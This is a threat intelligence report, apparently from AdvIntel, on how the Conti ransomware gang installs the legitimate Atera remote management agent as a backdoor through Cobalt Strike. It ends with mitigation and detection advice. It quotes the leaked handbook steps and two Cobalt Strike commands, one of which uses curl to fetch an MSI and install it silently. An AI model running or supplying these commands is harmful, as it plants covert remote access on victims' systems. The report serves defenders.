This report is based on our actual proactive victim breach intelligence and subsequent
incident response (not a simulated or sandbox environment) identified via unique high-value
collections at AdvIntel.

Adversary Tactics Chain Flow:
1. Conti Access via TrickBot, Buer, BazarBackdoor, AnchorDNS
2. Cobalt Strike beacon
3. Atera Agent Installation
4. Persistence & Shell Execution to Survive Cobalt Strike detections

2/7

Adversaries leverage Cobalt Strike command-line interfaces to interact with systems and
execute other software during the course of a ransomware operation.

What is Atera?

Atera is an IT management solution that enables monitoring, management, and
automation of hundreds of SMB IT networks from a single console. Atera includes a
remote control, patch management, discovery, inventory of IT assets, monitoring, security,
backup, and more.

Deploying Atera Agent as "Backdoor"

The idea behind this tactic is to leveraging a legitimate remote management agent Atera to
survive possible Cobalt Strike detections from the endpoint detection and response platform.
Relying on the legitimate tool to achieve persistence is a core idea leverage by the
ransomware pentesting team.

4/7

While reviewing Conti incidents that we proactively identified, monitored, and alerted via our
threat prevention platform Andariel, AdvIntel has identified that Atera played the key role in
allowing secret backdoor installations on the host right after the Conti gang obtained initial
access via TrickBot, BazarBackdoor, AnchorDNS, or Cobalt Strike directly.
Conti Operational Handbook: Atera as Backdoor

The disgruntled Conti operator leaked the tactics matching our proactive cases.

The method includes the following steps as translated from the tutorial:
1. Registration of the agent access via the official website
2. Click on download and set up agent access with the script
3. Run the agent installation via the Cobalt Strike “shell atera_run.msi”
4. Observe the device beacon in the Atera system
5. Remove the installation script artifacts

I. Cobalt Strike command via curl command execution for Atera Agent installation.
shell curl -o setup.msi "http://REDACTED.servicedesk.atera.com/GetAgent/Msi/?
customerId=1&integratorLogin=REDACTED%40protonmail.com" && msiexec /i setup.msi /qn
IntegratorLogin=REDACTED@protonmail.com CompanyId=1

II. Cobalt Strike command via the uploaded .msi installer script exported from the Atera
Agent console
upload C:\programdata\setup_undefined.msi
shell setup_undefined.msi

Atera Agent "Backdoor" Relevancy

The Atera agent allows the following connection option for the ransomware groups to
achieve persistence:
Splashtop
AnyDesk
TeamViewer
ScreenConnect
Additionally, the agent allows direct command-prompt and PowerShell shell execution into
the agent-installed environment.

Operational Insight

The Atera Agent allowed the Conti gang to regain access to infected protected
environments, especially environments that were equipped with more aggressive machine
learning endpoint detection-and-response anti-virus products.

The benefit is obvious - once Conti receives the desired access to the trial version of Atera
with the burner account they obtain a shell and backdoor access to the environment
maintained by a legitimate software tool.

We asesses with high condence the theme of leveraging tooling around legitimate and
trusted software as a backdoor will continue to be the tactics leveraged by the
ransomware pentester groups based on their latest tactics.

6/7

In most of the cases, the adversaries leveraged protonmail[.]com and outlook[.]com email
accounts to register with Atera to receive an agent installation script and console access.
Therefore, this backdoor access is not a central compromise of Atera, but rather a
registration loophole leveraged by the adversaries to obtain Atera trial access simply via
anonymous emails.

Mitigation

Audit and/or block command-line interpreters by using whitelisting tools, like AppLocker or
Software Restriction Policies with the focus on any suspicious “curl” command and
unauthorized “.msi” installer scripts particularly those from C:\ProgramData and C:\Temp
directory

Detection Methods

Command-line interface activities can be captured through proper logging of process
execution with command-line arguments.
